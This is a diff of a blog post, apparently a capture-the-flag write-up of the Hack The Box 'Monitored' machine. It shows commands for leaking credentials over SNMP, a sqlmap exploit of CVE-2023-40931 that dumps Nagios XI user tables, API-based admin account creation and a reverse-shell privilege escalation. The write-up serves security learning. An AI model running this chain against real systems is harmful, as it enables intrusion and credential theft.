@@ -163,8 +163,8 @@ we need to add the line <code class="language-plaintext highlighter-rouge">&lt;m
 <p><img src="../figs/monitored1.png" alt="landing page" /></p>
 
 <p>If we click on “Access Nagios”, we will be brought to a login page, at <code class="language-plaintext highlighter-rouge">/nagiosxi/login.php</code>. I’ve tried to brute-force it and
-send send SQL injection payloads, but that did not work. We know that this service is called Nagios XI, so my next step was to
-look for common vulnerabilities revolving around this service. Upon a quick search, we find <a href="https://outpost24.com/blog/nagios-xi-vulnerabilities/">this</a> blog about Nagios XI CVEs. One that stands out to me is the first one, CVE-2023-40931. It reads:</p>
+send send SQL injection payloads, but with no success. We know that this service is called Nagios XI, so my next step was to
+look for common vulnerabilities revolving around it. Upon a quick search, we find <a href="https://outpost24.com/blog/nagios-xi-vulnerabilities/">this</a> blog about Nagios XI CVEs. One that stands out to me is the first one, CVE-2023-40931. It reads:</p>
 
 <blockquote>
   <p>Nagios XI features “Announcement Banners”, which can optionally be acknowledged by users. The endpoint for this feature is vulnerable to a SQL Injection attack.</p>
@@ -174,8 +174,7 @@ look for common vulnerabilities revolving around this service. Upon a quick sear
   <p>The ID parameter is assumed to be trusted but comes directly from the client without sanitization. This leads to a SQL Injection where an authenticated user with low or no privileges can retrieve sensitive data, such as from the <code class="language-plaintext highlighter-rouge">xi_session</code> and <code class="language-plaintext highlighter-rouge">xi_users</code> table containing data such as emails, usernames, hashed passwords, API tokens, and backend tickets.</p>
 </blockquote>
 
-<p>As we can see, this vulnerability seems plausible, but we need a way in, since it only works if we have at least
-access to a low privileged user.</p>
+<p>As we can see, this vulnerability only works if we have at least access to a low privileged user. We need a way in to test it.</p>
 
 <p>I’ve ran <code class="language-plaintext highlighter-rouge">ffuf -u http://nagios.monitored.htb/nagiosxi/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt</code> to enumerate endpoints and this is what I’ve got:</p>
 
@@ -197,14 +196,14 @@ api                     <span class="o">[</span>Status: 301, Size: 337, Words: 2
 terminal                <span class="o">[</span>Status: 200, Size: 5215, Words: 1247, Lines: 124, Duration: 204ms]
 </code></pre></div></div>
 
-<p>The only interesting endpoint is <code class="language-plaintext highlighter-rouge">terminal</code>, which seems to be a terminal access to the server.</p>
+<p>At first glance, the only interesting endpoint is <code class="language-plaintext highlighter-rouge">terminal</code>, which seems to be a terminal access to the server.</p>
 
 <p><img src="../figs/monitored2.png" alt="terminal endpoint" /></p>
 
 <p>However, this is not useful unless we have credentials to login.</p>
 
-<p>We also see that there is an API endpoint, which might contain information disclosure or other ways in. However, after enumerating it, all I got was 403 status codes. Ok, let’s step back a little. We have found some interesting vectors, but we might need to 
-find the credentials ourselves within the recon. According to Nagios XI documentation, it seems to be a network monitoring system. 
+<p>Ok, let’s step back a little. We have found some interesting vectors, but we might need to 
+find the credentials. According to Nagios XI documentation, the service seems to be a network monitoring system. 
 With a bit of research, we find <a href="https://www.nagios.com/solutions/snmp-monitoring/">this</a> page stating that Nagios XI provides complete monitoring of SNMP (Simple Network Message Protocol). SNMP runs on UDP port 161/162, and that was not shown on our first 
 Nmap scan. This is because we have not specified it to perform a UDP scan. Let’s re-run Nmap with that in mind now:</p>
 
@@ -277,7 +276,7 @@ HOST-RESOURCES-MIB::hrSWRunParameters.1382 <span class="o">=</span> STRING: <spa
 </code></pre></div></div>
 
 <p>We can see that the STRING parameter seems to be setting a user <code class="language-plaintext highlighter-rouge">svc</code> to run the command <code class="language-plaintext highlighter-rouge">check_host.sh</code> passing the username <code class="language-plaintext highlighter-rouge">svc</code> and what it seems to be a password <code class="language-plaintext highlighter-rouge">XjH7VCehowpR1xZB</code>. We can try to login with these credentials at <code class="language-plaintext highlighter-rouge">/nagiosxi/login.php</code> 
-web service endpoint, but this will give</p>
+web service endpoint, but that won’t work:</p>
 
 <p><img src="../figs/monitored3.png" alt="failed login attempt" /></p>
 
@@ -359,12 +358,12 @@ bugs                    [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 24
 [...snip...]
 </span></code></pre></div></div>
 
-<p>All of them giving a 200 status code indicates the server is just sending us some messages about the request. We need more info about the messages the server is sending back to us. For that, let’s run <code class="language-plaintext highlighter-rouge">ffuf</code> in silent mode and redirect the output to <code class="language-plaintext highlighter-rouge">api-endpoints.txt</code>.</p>
+<p>All of them giving a 200 status code indicates the server is just sending us some messages about the request. We need more info about these messages. For that, let’s run <code class="language-plaintext highlighter-rouge">ffuf</code> in silent mode and redirect the output to <code class="language-plaintext highlighter-rouge">api-endpoints.txt</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ffuf <span class="nt">-u</span> https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt <span class="nt">-s</span> <span class="o">&gt;</span> api-endpoints.txt
 </code></pre></div></div>
 
-<p>Note that most of them gives the same message: <code class="language-plaintext highlighter-rouge">Message {"error":"No API Key provided"}</code>. That being noted, we will write a python script to see if there is any other messages within these:</p>
+<p>Note that most of the messages are: <code class="language-plaintext highlighter-rouge">Message {"error":"No API Key provided"}</code>. That being noted, we will write a python script to see if there is any other messages:</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
 <span class="kn">import</span> <span class="n">sys</span>
@@ -396,7 +395,7 @@ bugs                    [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 24
     <span class="nf">main</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
 </code></pre></div></div>
 
-<p>We are filtering it out any messages that contain <code class="language-plaintext highlighter-rouge">No API Key provided</code> string and printing the ones with a different message.</p>
+<p>We are filtering it out any messages that contain <code class="language-plaintext highlighter-rouge">No API Key provided</code> string and printing the ones with a different message. Running the script yields:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python fetch-req-msg.py https://nagios.monitored.htb/nagiosxi/api/v1/ api-endpoints.txt 
 Message <span class="o">{</span><span class="s2">"error"</span>:<span class="s2">"No request was made"</span><span class="o">}</span>
@@ -407,7 +406,7 @@ Message <span class="o">{</span><span class="s2">"error"</span>:<span class="s2"
 </code></pre></div></div>
 
 <p>We note an authentication endpoint present that does not require an API key. After a bit of research, I’ve found <a href="https://support.nagios.com/forum/viewtopic.php?f=16&amp;t=58783">this</a> topic on this endpoint, where it states that we can authenticate via cURL using 
-<code class="language-plaintext highlighter-rouge">curl -XPOST -k -L 'http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=nagiosadmin&amp;password=YOURPASS&amp;valid_min=5'</code>. We can try to authenticate and retrieve an API key with the credentials we found using snmpwalk:</p>
+<code class="language-plaintext highlighter-rouge">curl -XPOST -k -L 'http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=nagiosadmin&amp;password=YOURPASS&amp;valid_min=5'</code>. We can try to authenticate with the credentials we found using snmpwalk:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-XPOST</span> <span class="nt">-k</span> <span class="nt">-L</span> <span class="s1">'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1'</span> <span class="nt">-d</span> <span class="s1">'username=svc&amp;password=XjH7VCehowpR1xZB&amp;valid_min=1000'</span>
 <span class="o">{</span>
@@ -419,7 +418,7 @@ Message <span class="o">{</span><span class="s2">"error"</span>:<span class="s2"
 <span class="o">}</span>
 </code></pre></div></div>
 
-<p>And we have our API token! Now, we can attempt to abuse CVE-2023-40931 and try to retrieve the administrator’s password or other sensitive information. Taking a look at the CVE, we see that the affected endpoint is <code class="language-plaintext highlighter-rouge">/nagiosxi/admin/banner_message-ajaxhelper.php</code> and we must send a POST request. With BurpSuite, this becomes easy:</p>
+<p>From this, we got an auth_token, which might be more than enough to test and abuse CVE-2023-40931. Taking a look at the CVE, we see that the affected endpoint is <code class="language-plaintext highlighter-rouge">/nagiosxi/admin/banner_message-ajaxhelper.php</code> and we must send a POST request. With BurpSuite, this becomes easy:</p>
 
 <p><img src="../figs/monitored5.png" alt="SQLi endpoint request" /></p>
 
@@ -432,7 +431,7 @@ did not work either. Finally, after some attempts, I’ve tried to change the re
 
 <p><img src="../figs/monitored7.png" alt="SQLi endpoint request" /></p>
 
-<p>Amazing! It seems we might have a SQL injection here. Let’s run SQLMap to test it. One thing I noticed though is that the auth_token can only be used once per request. This means we will need a command to pass a different auth_token for every SQLMap request. To do so, we’ll use this <code class="language-plaintext highlighter-rouge">curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d "username=svc&amp;password=XjH7VCehowpR1xZB&amp;valid_min=500" | awk -F'"' '{print$12}'</code> command to clean the output to just be the token itself, and then run SQLMap with <code class="language-plaintext highlighter-rouge">-T xi_users</code>, which is the table in Nagios XI that contains users information.</p>
+<p>The error message indicates we might have a SQL injection here. Let’s run SQLMap to test it. One thing I noticed though is that the auth_token can only be used once per request. This means we will need a command to pass a different auth_token for every SQLMap request. To do so, we’ll use this <code class="language-plaintext highlighter-rouge">curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d "username=svc&amp;password=XjH7VCehowpR1xZB&amp;valid_min=500" | awk -F'"' '{print$12}'</code> command to clean the output to just be the token itself, and then run SQLMap with <code class="language-plaintext highlighter-rouge">-T xi_users</code>, which is the table in Nagios XI that contains users information.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>sqlmap <span class="nt">-u</span> <span class="s2">"https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&amp;token=</span><span class="sb">`</span>curl <span class="nt">-ksX</span> POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate <span class="nt">-d</span> <span class="s2">"username=svc&amp;password=XjH7VCehowpR1xZB&amp;valid_min=500"</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">'"'</span> <span class="s1">'{print$12}'</span><span class="sb">`</span><span class="s2">"</span> <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3 <span class="nt">-p</span> <span class="nb">id</span> <span class="nt">--batch</span> <span class="nt">-D</span> nagiosxi <span class="nt">--dump</span> <span class="nt">-T</span> xi_users
         ___
@@ -468,9 +467,9 @@ Table: xi_users
 +---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
 </code></pre></div></div>
 
-<p>And we found the administrator’s API key and password. Using <a href="https://www.tunnelsup.com/hash-analyzer/">Hash Analyzer</a> we can see that the password is using bcrypt hash. I’ve tried to find a match with John The Ripper, but with no success. So this got me thinking… Maybe we can use the administrator API key to create another admin account within Nagios XI, then log in with it.
+<p>Giving us access to the administrator’s API key and password. Using <a href="https://www.tunnelsup.com/hash-analyzer/">Hash Analyzer</a> we can see that the password is using bcrypt hash. I’ve tried to find a match with John The Ripper, but with no success. So this got me thinking… Maybe we can use the administrator API key to create another admin account within Nagios XI, then log in with it.
 Again, with a bit research, we can find <a href="https://support.nagios.com/forum/viewtopic.php?f=16&amp;t=42923">this</a> topic, where it says
-we can create an accout with this cURL command <code class="language-plaintext highlighter-rouge">curl -XPOST "http://x.x.x.x/nagiosxi/api/v1/system/user?apikey=LTltbjobR0X3V5ViDIitYaI8hjsjoFBaOcWYukamF7oAsD8lhJRvSPWq8I3PjTf7&amp;pretty=1" -d "username=jmcdouglas&amp;password=test&amp;name=Jordan%20McDouglas&amp;email=jmcdouglas@localhost"</code>. However, this will create a normal user. We need an admin user. Then, I found (this)[https://www.exploit-db.com/exploits/44969] on exploit-db, which is a completely different exploit, but has these lines:</p>
+we can create an accout with this cURL command <code class="language-plaintext highlighter-rouge">curl -XPOST "http://x.x.x.x/nagiosxi/api/v1/system/user?apikey=LTltbjobR0X3V5ViDIitYaI8hjsjoFBaOcWYukamF7oAsD8lhJRvSPWq8I3PjTf7&amp;pretty=1" -d "username=jmcdouglas&amp;password=test&amp;name=Jordan%20McDouglas&amp;email=jmcdouglas@localhost"</code>. However, this will create a normal user. We need an admin user. Then, I found <a href="https://www.exploit-db.com/exploits/44969">this</a> on exploit-db, which is a completely different exploit, but has these lines:</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">def</span> <span class="nf">try_add_admin</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">passwd</span><span class="p">)</span>
     <span class="n">vprint_status</span> <span class="sh">"</span><span class="s">STEP 3: trying to add admin user with key #{key}</span><span class="sh">"</span>
@@ -585,7 +584,7 @@ User nagios may run the following commands on localhost:
              └─727 /usr/local/nagios/bin/npcd <span class="nt">-f</span> /usr/local/nagios/etc/pnp/npcd.cfg
 </code></pre></div></div>
 
-<p>As we can see, the <code class="language-plaintext highlighter-rouge">npcd.service</code> calls <code class="language-plaintext highlighter-rouge">/usr/share/nagios/bin/npcd</code> when running. But we also have write privileges on this directory and in the file:</p>
+<p>As we can see, the <code class="language-plaintext highlighter-rouge">npcd.service</code> calls <code class="language-plaintext highlighter-rouge">/usr/share/nagios/bin/npcd</code> when running, and we also have write privileges on this directory and in the file:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nagios@monitored:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /usr/local/nagios/bin
 <span class="nb">ls</span> <span class="nt">-la</span> /usr/local/nagios/bin
@@ -605,7 +604,7 @@ drwxr-xr-x 8 root   root      4096 Nov  9 10:40 ..
 
 <p>This means that we could erase the contents of <code class="language-plaintext highlighter-rouge">npcd</code> binary and replace it with a reverse shell. If this succeeds, we might get root.</p>
 
-<h2 id="-getting-root"><a href="#solving"></a> Getting root</h2>
+<h2 id="-step-4---privilege-escalation"><a href="#solving"></a> Step 4 - Privilege escalation</h2>
 
 <p>Let’s try it out! First, we need to stop the service in order to be able to alter the file’s content:</p>
 
@@ -631,7 +630,7 @@ bash -c '</span>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp;
 
 <p>This was a nice ride. Lots of rabbit holes along the way, but lots of new things learned. We were able to find our way in the website by first using snmpwalk which leaked some unprivileged user credentials. With these, we were able to create authentication tokens at <code class="language-plaintext highlighter-rouge">/nagiosxi/api/v1/authenticate</code> endpoint, which were then used to test a SQL injection at <code class="language-plaintext highlighter-rouge">/nagiosxi/admin/banner_message-ajaxhelper.php</code> endpoint. With SQLMap, we were able to retrieve the administrator API key, which was used to create a new admin account under Nagios XI. Then, this newly created admin account provided us the opportunity to run a reverse shell within Nagios XI commands, granting us the user shell.</p>
 
-<p>From there, we simply listed all sudo commands that we could run without a password to find one that used service running from a binary that we had written permissions. We added our second reverse shell payload into it, restarted the service, and got the root shell.</p>
+<p>From there, we simply listed all sudo commands that we could run without a password to find one that used service running from a binary that we had write permissions. We added our second reverse shell payload into it, restarted the service, and got the root shell.</p>
 
 <p>Simply amazing!</p>
 
